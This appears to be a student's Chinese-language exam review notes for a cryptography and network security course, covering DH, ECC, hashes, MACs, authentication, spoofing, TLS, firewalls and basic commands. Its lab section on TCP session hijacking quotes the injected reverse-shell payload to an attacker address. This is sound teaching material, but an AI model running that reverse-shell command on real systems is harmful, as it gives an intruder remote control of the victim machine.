* 计时攻击：这类方法依赖于解密算法的运行时间
* 基于硬件故障的攻击：这种方法应用产生签名过程中处理器发生的故障
* 选择密文攻击：这种攻击利用了RSA算法的性质

RSA抗穷举攻击的方法是使用大密钥空间，所以e和d的位数越大越好，但是由于加解密含有复杂的计算，密钥越大也会导致系统运行速度变慢。





## 十、密钥管理和其他公钥密码体制

> - [x] 👌DH密钥交换算法（图10.1）及针对DH算法的中间人攻击（图10.2）

### DH密钥交换算法

![1704544545384](1704544545384.png)

DH密钥交换的安全性建立在这样的事实下：**求关于素数的模素数幂运算相对容易，而计算离散对数却非常困难；对于大素数，求离散对数被认为是不可行的。**

### 针对DH算法的中间人攻击

![1704544603526](1704544603526.png)

密钥交换协议不能抵抗上述的攻击，因为它没有对通信的参与方式进行认证。这些缺陷可以通过使用**数字签名和公钥证书**来克服。



### ✨椭圆曲线密码学(ECC)

与RSA相比，ECC的主要诱人之处在于，它可以使用比RSA短得多的密钥得到相同的安全性，因此可以减少处理负荷。

> - [x] 👌椭圆曲线密码学ECC：ECC的安全性，仅掌握结论性的内容即可

* ECC利用EC上的离散对数难题(ECDLP)，这和利用有限域Zp上的离散对数难题(DLP)是一样的方法。ECC中应用适用两类椭圆曲线：定义在Zp上的素曲线和在GF(2m)上构造的二元曲线。
* 在一般数域上的离散对数问题（以及大数分解问题）存在亚指数级时间复杂度求解算法，而ECDLP只有纯指数算法（比大数分解和一般数域上的离散对数问题更难解）。
* 应用：密钥交换、加密解密、数字签名

==关于速度==

* 速度
  * **在密钥长度相等的情况下，RSA和ECC的速度相当；**
  * **但是在相同的安全强度要求下，ECC的密钥更短；**

故

* **ECC较好**
* **目前广泛使用**

==操作==

椭圆曲线的三次方程：
$$
y^2+axy+by=x^3+cx^2+dx+e
$$
可以将方程限制为下述形式：
$$
y^2=x^3+ax+b
$$
ECC太复杂了......直接摘书：

![1704545558655](1704545558655.png)

## 十一、密码学hash函数

Hash函数是一个单向的消息摘要函数，应用于**消息认证和数字签名**

==认证函数==

	1. 对称加密
	2. 公钥加密
	3. 消息认证码（MAC）		
	4. 散列函数（Hash）

> - [x] 👌哈希函数在消息认证、数字签名以及其他方面的应用（表11.2），参见图11.3和图11.4，ppt

### 散列函数的应用

![1704546179619](1704546179619.png)

#### 用于消息认证

散列函数用于消息认证，更一般地，使用消息认证码MAC实现消息认证

![1704546254505](1704546254505.png)

#### 用于数字签名

![1704546298718](1704546298718.png)

#### 其他应用

* 保护文件完整性

  当用户下载软件包时可以验证其内容是否合法

* 口令的单向存储

  操作系统的口令存储使用口令的散列值：Windows和Linux下的口令存储，可以进一步扩展口令破解、彩虹表等其他内容

> - [x] 👌密码学hash函数的安全性需求、穷举攻击（哈希值长m，抗原像攻击2^m^和抗第二原像攻击2^m^、碰撞攻击2^m/2^）参见表11.1和225页表（没有表名）

### 针对Hash函数的攻击

* 穷举攻击

  * 给定hash值h，试图找到满足H(y)=h 的y。对于m位的hash值，穷举规模为2m。
  * 试图找x和y，满足H(x)=H(y), 其穷举规模相对小，为2m/2。(根据生日悖论)

  > 抗原像攻击： 2^m^
  > 抗弱碰撞攻击： 2^m^
  > 抗强碰撞攻击： 2^m/2^

![1704546576742](1704546576742.png)

### SHA参数比较

> - [x] 👌安全hash算法参数： SHA参数比较，参见表11.3和表11.5（主要是消息摘要长度）

 

![1704546788688](1704546788688.png)

![1704546847588](1704546847588.png)

## 十二、消息认证码

### 消息认证

> - [x] 👌什么是消息认证、消息认证需求（网络环境中可能面临的攻击形式）、如何实现消息认证（即消息认证函数的类型）？

#### 消息认证的需求

网络通信环境中的攻击

* 消息透露给没有合法密钥的任何人或程序
* **传输分析**：分析通信双方的通信模式。在面向链接的应用中，确定连接的频率和持续的时间；在面向链接或无连接的环境中，确定双方的消息数量和长度。
* **伪装**：欺诈源向网络中插入一条消息。如攻击者产生一条消息并声称这条消息来自某合法实体，或者向非消息接收方发送的关于收到或未收到的消息的欺诈应答。
* **内容修改**：对消息内容的修改，包括插入、删除、转换和修改
* **顺序修改**：对通信双方消息顺序的修改，包括插入、删除和重新排序。
* **计时修改**：对消息的延时和重播。在面向连接的应用中，整个消息序列可能是前面某项合法消息序列的重播，也可能是消息序列的=中的一条消息被延时或重播；在面向无连接的应用中，可能是一条消息（如数据报）被延时或重播。
* **发送方否认**：发送方否认发送过某消息。
* **接受方否认**：接收方否认接受过某消息。

#### 实现消息认证

* Hash函数它是任意长的消息映射为定长的Hash值的函数，以该值作为验证符。
* 消息加密：对整条消息进行加密后的密文作为认证符。
* 消息验证吗(MAC)：它是消息和密钥的函数，它产生定长的值，以该值作为认证符。

### 消息认证码MAC

> - [x] 👌什么消息认证码？消息认证码的基本用途（图12.4），消息认证码的实现方式的两种方式：基于散列函数的HMAC和基于分组密码的CMAC（实现细节不在考试范围）



* 消息认证码：是一种认证技术，它利用密钥生成一个固定长度的短数据块(MAC)，并将该数据块附加在消息之后。（假定双方共享密钥）
* 发送方利用密钥从明文产生一个固定长度的短数据块，和消息一起传输；	
* 接收方对收到消息用相同的密钥进行相同的计算，得出新的MAC，并与接收到的MAC比较，以判断消息是否被改动过，以及消息是否来自真正的发送方。
* MAC函数
  * 计算明文M在密钥K的作用下的特征码
    * M || MAC(M, K)
  * 验证时，判断明文M和MAC码是否一致



==讨论==

* MAC不需要可逆
* 为了方便，MAC码通常较短
* 实现MAC函数不排斥使用对称加密算法
* 实现MAC函数希望使用比加密更高效的方法
* 为防范重放攻击，加注时间、报文序号
* 对称MAC不能提供签名特性
  * 因为产生MAC的密钥为两方所有
* 基于分组密码的MAC和基于HASH的MAC

#### 消息认证码的实现方式的两种方式

- 基于散列函数的HMAC
- 基于分组密码的CMAC

==MAC/HMAC的安全性==

* 攻击加密算法
  * （如果有使用加密算法）

* 攻击Hash函数

  * 单向

  * 找碰撞报文		// Hash值大小

  * 生日攻击

    ![image-20240107210500869](image-20240107210500869.png)

    ![image-20240107210448427](image-20240107210448427.png)

* 攻击使用方法
  * 不正确的实现和使用方式

#### 消息认证码的基本用途(图12.4)

![1704630743429](1704630743429.png)

> - [x] 👌认证和加密的通用方案、认证加密CCM和GCM（知道名称即可，CCM和GCM的实现细节不在考试范围）

###  认证加密GCM

Authenticated Encryption with Associated Data (AEAD) 是一种同时具备保密性，完整性和可认证性的加密形式。

早期加密算法和认证算法的组合是不安全的。

2018年起，在一个算法在内部**同时实现加密和认证**

`AES-128-GCM`

``AES-192-GCM`

`AES-256-GCM`

`ChaCha20-IETF-Poly1305（流密码，移动设备多用）`

``XChaCha20-IETF-Poly1305`

![image-20240107210628682](image-20240107210628682.png)

![image-20240107210648276](image-20240107210648276.png)

## 十三、数字签名技术

28. 什么是数字签名？数字签名特征、需求，常见的数字签名算法DSA（算法实现不在考试范围）、使用RSA私钥如何实现数字签名? （图11.4 数字签名简要示例）
29. 消息认证码和数字签名有什么区别？（见消息认证码和数字签名作业）

 

## 十四、轻量级密码和后量子密码

 

## 十五、密钥管理与分发

30. 对称密钥分发：基于对称加密的对称密钥分发（图15.1两个通信实体之间的密钥分发）、基于非对称加密的对称密钥分发（图15.4中间人攻击、图15.5利用公钥分发密钥）
31. 公钥分发：公钥证书（图15.9公钥证书的交换、图15.10 X.509公钥证书的应用）、X.509证书、公钥基础设施PKI包括哪些关键元素及其作用P322页

 

## 十六、用户认证

> - [x] 👌什么是身份认证？认证方式有哪些？

认证身份的四个常用工具

* 知道什么：口令、pin码或者之前准备问题的答案

- 拥有什么：加密密钥、电子密钥卡、智能卡或物理密钥，这种类型的认证信息称为令牌

* 静态生物特征：如指纹、视网膜和脸

- 动态生物特征：如声音模式、手写特征和打字节奏

==基于口令的认证方式==

一般过程：

1. 初始化：用户选择口令、口令的散列值存储在口令文件中

2. 身份认证阶段：用户登录系统、提供口令、系统计算散列值，并进行比较

基于口令的认证—弱认证方式

口令在相当长的时间内固定

明文存放或哈希后存放

通过设置规则（如字母、数字、长度等），避免设置弱口令

Salt（盐值）提高字典攻击的穷举空间

==针对口令的攻击==

* 重放攻击（因口令一般一段时间内固定）
* 穷举攻击
  * 8个字符相当于40-50bits的穷举空间
* 字典攻击
  * 在线字典攻击
  * 离线字典攻击
    * 建立离线字典文件：口令列表、与攻击目标系统采用同样的hash算法，计算生成的口令hash值
    * 获取passwd文件：passwd文件里的hash值与字典文件中的hash进行比对

> - [ ] 👌认证中的抗重放机制：时间戳和挑战应答（参见16.1.4小节）



> - [x] 👌基于挑战应答的身份认证（主要见ppt）、keberos认证（不在考试范围）

### 质询/应答challenge/response的基本逻辑

* B要完成对A的身份认证
  * 身份认证基于A所知道的某个秘密（例如密钥）
  * 首先B发给A一个随机数（challenge）
  * A收到这个随机数之后，对它做某种变换，得到response报文，并发送回去
  * Response 同时依赖于随机数（challenge）和A说知道的这个秘密
  * B收到response后，可以验证A是知道这个秘密的
* 在有的协议中，这个challenge也称为nonce（可能是明文传输，也可能是密文传输）
* A生成Response的典型变换有：
  * A使用密钥加密，说明A知道这个密钥
  * 有时会对challenge简单运算，比如增一，再做加密处理
* 质询与应答是构造更复杂的交互式认证协议的基本组件

### 质询应答的实现方式

* 使用对称密钥
  * 对称密钥加密
  * 消息散列、消息认证码
* 使用公钥密码
* 数字签名



* 弱的身份认证
  * 基于口令、PIN码等
  * 动态口令（半强的）
* 强的（基于密码技术的）身份认证
  * 挑战/应答技术（质询与应答技术）
* 基于可信第三方的身份认证（不仅实现身份认证，还解决密钥分发问题）
  * Kerberos协议（课程不讲细节）
  * Needham-Schroeder协议

==小结==

> * Kerberos主要是局域网上的认证系统，它早期基于对称算法，封装了加密、认证等安全服务，提供了统一的用户接口。后期Kerberos也开始支持公钥，使用证书。（本课程略）
>
> * PKI/CA好像是解决电子商务安全的正确道路。CA是一个离线中心，因此适合互联网这种分布式又管理松散的环境。但是维护一个CA（不管是商用CA或自己独立的CA）给人的感觉是过于复杂。





> - [ ] 👌补充：访问控制和审计技术。访问控制概念、作用、3种访问控制策略（强制访问控制、自主访问控制、基于角色的访问控制，…）、访问控制矩阵（不在考试范围）



> - [ ] 👌linux文件系统权限（见中文ppt）

 

### 常见网络攻击

> - [ ] 👌嗅探、欺骗(ARP欺骗、IP欺骗)、TCP会话劫持、拒绝服务攻击四类攻击的特点、常见的防范方法。

#### 嗅探的目的

* 窃取各种用户名和口令
* 窃取机密的信息
  * 如电子邮件正文及附件、网络打印的文档等 
* 窥探底层的协议信息
  * 如DNS的IP地址、本机IP地址、本机MAC地址，远程主机的IP地址、网关的IP地址、一次TCP连接的Sequence Numbe
* 中间人攻击时篡改数据的基础

#### 欺骗(ARP欺骗、IP欺骗)

==ARP协议工作原理==

①每台主机设备上都拥有一个ARP缓存(ARP Cache)

②检查自己的ARP缓存，有，直接映射，无，广播ARP请求包（见下页图）

 ③检查数据包中的目标IP地址是否与自己的IP地址一致，如一致，发送ARP响应，告知MAC地址

 ④源节点在收到这个ARP响应数据包后，将得到的目标主机IP地址和MAC地址对映射表项添加到自己的ARP缓存中

`ARP欺骗：发送伪造ARP消息，对特定IP所对应的MAC地址进行假冒欺骗，从而达到恶意目的`

==ARP包结构及其封装==

![image-20240107212841256](image-20240107212841256.png)

场景1

![image-20240107212903930](image-20240107212903930.png)

场景2

![image-20240107212927236](image-20240107212927236.png)

##### ARP攻击的应用场景

* 利用ARP欺骗进行交换网络中的嗅探
* ARP欺骗构造中间人攻击，从而实施TCP会话劫持
* ARP病毒：中毒的机器会伪造某台电脑的MAC地址，如果该伪造地址为网关服务器的地址，那么对整个网络均会造成影响，用户表现为上网经常瞬断
* ARP欺骗挂马

##### ARP欺骗攻击防范措施

* 静态绑定关键主机的IP地址与MAC地址映射关系
  * 网关/关键服务器
  * "arp-s IP地址MAC地址类型"
* 使用相应的ARP防范工具
  * ARP防火墙
* 使用VLAN虚拟子网细分网络拓扑

##### 网络层 -- IP源地址欺骗

* IP源地址欺骗 – 假冒IP攻击
  * 伪造具有虚假源地址的IP数据包进行发送
  * 目的：隐藏攻击者身份、假冒其他计算机
* IP源地址欺骗原理
  * 路由转发只是用目标IP地址，不对源做验证
  * 通常情况：无法获得响应包
  * 在无法获得响应包的情况下，可通过猜测TCP三次握手中所需的信息，假冒IP建立起TCP连接

> 针对Web应用程序的常见攻击的特点、常见的防范方法？（SQL注入、XSS跨站脚本、CSRF跨站请求伪造）。

## 十七、传输层安全

> - [x] 👌Web安全威胁有哪些？（从web通信中涉及的浏览器、web服务器和通信信道的角度来讨论web安全威胁）

Web面临的一些安全威胁的分类。

一种归类方式：

`被动攻击`：在浏览器和服务器通信时窃听，获得原本被限制使用的权限

`主动攻击`：伪装成其他用户、篡改客户和服务器之间的消息或篡改Web站点的信息

另一种分类方法：

按威胁的位置分类：Web服务器、Web浏览器和服务器与浏览器之间的网络通信。

### Web安全性威胁对照表

![1704634437528](1704634437528.png)

> - [x] 👌web流量安全方法，即按照协议分层，各层安全网络协议有哪些？（图17.1TCP/IP协议栈中安全功能的相对位置）

### TCP/IP协议栈中安全功能的相对位置

![1704634608919](1704634608919.png)

### TLS体系结构

> - [x] 👌TLS体系结构、SSL/TLS提供哪些服务？SSL/TLS协议实现、记录协议

TLS为TCP提供了可靠的端到端的安全服务。TLS不是简单的单个协议而是两层协议。

![1704634930678](1704634930678.png)

> - [ ] 👌TLS的握手协议过程、基于wireshark的SSL/TLS数据包捕获结果分析（考试重点，尤其是握手协议过程，参见图17.6）

###  ✨握手协议过程

![image-20240107214547593](image-20240107214547593.png)

![1704635100704](1704635100704.png)

### ✨✨wireshark抓包实验

可以转这篇：[wireshark抓包实验](/posts/knowledge/review_notes/wireshark/)

#### 实际抓包截图分析

![image-20240107214735588](image-20240107214735588.png)

实际的场景：客户端（10.0.2.5） ， sever（10.0.2.6），Attacker （10.0.2.4）

客户端（10.0.2.5） telnet到sever（10.0.2.6）时的最后一个数据包，

下一数据就是伪造的数据包

![image-20240107214821535](image-20240107214821535.png)

攻击者伪造的数据包：冒充客户端（10.0.2.5） 发送telnet数据到sever（10.0.2.6），数据

内容是”/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1”

![image-20240107214843510](image-20240107214843510.png)

![image-20240107214853298](image-20240107214853298.png)

上图1为攻击的执行结果：可以看到攻击者ifconfig时的输出已经是10.0.2.6.

上图2为：攻击者发送的数据包格式

## 十九、无线网络安全

43. wifi登录密码破解原理

 

防火墙和入侵检测

44. 防火墙特点、类型

###  防火墙类型

* ==包过滤防火墙==

  过滤进入和外出的数据包，仅监视IP和TCP/UDP的头部, 不考虑负载

  * 静态包过滤（无状态）：访问控制列表ACL

    ![image-20240107215157320](image-20240107215157320.png)

  * 动态包过滤（有状态）：跟踪连接状态并根据连接状态决定是接受还是拒绝数据包

    ![image-20240107215206925](image-20240107215206925.png)

* 电路级网关：传输层代理，运行在传输层，检测IP地址和端口号(TCP/UDP)来确定连接是否合法
* 不允许内外部网络直接连接
* 一旦建立连接后，电路级网关只负责为双方传递数据包而不再做任何过滤

![image-20240107215248274](image-20240107215248274.png)

电路级网关中继外网用户到内网服务器的访问（典型的如SOCKS）

* 应用层网关：代理服务器,对所有数据包执行深度检查,SQL，具有检测恶意和可疑数据包的能力
* 应用层网关接受外网客户提交的访问内网服务器的请求，检查流入的IP包负载是否满足安全性要求。通过检查后，才将客户的请求传递给内网服务器，并缓存内网服务器返回给外网客户的结果



## 其他：

> - [ ] 👌与实验相关的Windows和Linux下最常见的命令行命令、常见端口80/443，23、25/110 Ping、nslookup、ipconfig、ifconfig、arp、chmod、ls

### windows常用基本命令

#### ping

**ping命令是个使用频率极高的网络诊断工具，在Windows、Unix和Linux系统下均适用。**

它是TCP/IP协议的一部分，<u>用于确定本地主机是否能与另一台主机交换数据包</u>。根据返回的信息，我们可以推断TCP/IP参数设置是否正确以及运行是否正常。

需要注意的是，成功与另一台主机进行一次或两次数据报交换并不表示TCP/IP配置就是正确的，必须成功执行大量的数据报交换，才能确信TCP/IP的正确性。

==ping命令的应用格式==

1. ping+IP地址或主机域名；
2. ping+IP地址或主机域名+命令参数；
3. ping+命令参数+IP地址或主机域名 。

注意，“+”要换成空格！当我们使用第①种格式时，默认只发送四个数据包。

#### nslookup

nslookup (全称 name server lookup) ，是一个在命令行界面下的网络工具，它有两种模式: 交互 & 非交互，进入交互模式在命令行界面直接输入nslookup按回车，非交互模式则是后面跟上查询的域名或者 IP 地址按回车。

nslookup语法格式：

```bash
nslookup –option1 –option2 host-to-find dns-server

nslookup baidu.com
nslookup -ty=ptr 8.8.8.8		# PTR反向DNS解析
nslookup/?		# 帮助界面
```



#### ipconfig

ipconfig是dos命令，可以在运行【win+r】里输入cmd，回车后进入命令行界面下进行操作。相关命令的作用如下：

* `ipconfig /?` 查询ipconfig的详细使用方法，例如可以附带的参数，每个参数的具体含义以及示例
* `ipconfig /all` 命令，相对于ipconfig命令，加上了all参数之后显示的信息将会更为完善，例如IP的主机信息，DNS信 息，物理地址信息，DHCP服务器信息等等
* `ipconfig /release` 释放现有的IP地 址
* `ipconfig /renew` 获得的IP地址和之前的地址一样，只有在原有的地址被占用的情况下才会获得一个新的地址
* `ipconfig /displaydns` 显示本地DNS内容
* `ipconfig /flushdns` 刷新DNS记录，如果电脑上不去网了就可以用这个方法来恢复上网。
* `Linux /Ubuntu`刷新DNS缓存 在Linux中刷新DNS记录

#### ifconfig

ifconfig 是 Linux 中用来查询和配置网络接口卡（网卡）的命令，英文全称是network interfaces configuring。

使用 ifconfig 命令对网卡所做的配置都是临时配置，重启之后都会被还原的。如果要永久配置网卡则需要通过修改配置文件的方式。

==命令==

* `ifconfig`：显示激活的网卡信息
* `ifconfig -a`：显示所有的网卡信息
* `ifconfig -s`：显示网卡的简要信息
* `ifconfig [网卡名称]//例：ifconfig enp0s3`：显示指定网卡的信息

#### arp

arp是地址解析协议，其基本功能为透过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。它是IPv4中网络层必不可少的协议，不过在IPv6中已不再适用，并被邻居发现协议（NDP）所替代。

==命令==

* `arp -a` ，当你需要显示当期ip地址对应的mac地址时使用。
* `arp -s` ，当你需要手动添加或绑定一条arp记录时使用。
* `arp -d`，当你觉得某条arp记录有问题时，可以删除。

#### ✨chmod

Linux/Unix 的档案调用权限分为三级 : 档案拥有者、群组、其他。利用 chmod 可以藉以控制档案如何被他人所调用。

```bash
mode : 权限设定字串，格式如下 : [ugoa...][[+-=][rwxX]...][,...]，其中
u 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。
+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。
r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。
-c : 若该档案权限确实已经更改，才显示其更改动作
-f : 若该档案权限无法被更改也不要显示错误讯息
-v : 显示权限变更的详细资料
-R : 对目前目录下的所有档案与子目录进行相同的权限变更(即以递回的方式逐个变更)
--help : 显示辅助说明
--version : 显示版本
```

Linux 系统中，文件的基本权限由 9 个字符组成，以 `rwxrw-r-x`为例，我们可以使用数字来代表各个权限，各个权限与数字的对应关系如下：
```bash
r --> 4
w --> 2
x --> 1
```

由于这 9 个字符分属 3 类用户，因此每种用户身份包含 3 个权限（r、w、x），通过将 3 个权限对应的数字累加，最终得到的值即可作为每种用户所具有的权限。

拿 `rwxrw-r-x` 来说，所有者、所属组和其他人分别对应的权限值为：
所有者 = `rwx` = 4+2+1 = 7
所属组 = `rw-` = 4+2 = 6
其他人 = `r-x` = 4+1 = 5

所以，此权限对应的权限值就是 765。

#### ls

列出文件是普通 Linux 用户和系统管理员最常承担的任务之一。在 Linux 中，ls 命令是“ list ”的缩写，用于列出或显示目录的内容。

|   选项   |                功能描述                |
| :------: | :------------------------------------: |
| `ls -m`  |       列出以逗号分隔的目录内容。       |
| `ls -Q`  |      显示用引号括起来的目录内容。      |
| `ls -l`  |         以长列表格式显示文件。         |
| `ls -lh` |     以人类可读的格式显示文件大小。     |
| `ls -g`  |            省略组所有权列。            |
| `ls -F`  |           向目录添加正斜杠。           |
| `ls -i`  |     显示文件和目录的 inode 数量。      |
| `ls -a`  |      显示所有文件，包括隐藏文件。      |
| `ls *.`  |        根据文件扩展名过滤文件。        |
| `ls -la` |    以长列表格式显示所有文件和目录。    |
| `ls -R`  |          递归显示文件和目录。          |
| `ls -r`  |             反向排序文件。             |
| `ls -X`  | 按文件扩展名的字母顺序对文件进行排序。 |
| `ls -tl` |    根据文件创建日期和时间显示文件。    |
| `ls -n`  |           列出 UID 和 GID。            |



> - [ ] 👌结合所学知识，设计能够实现特定安全目标的通信方案。

 

 
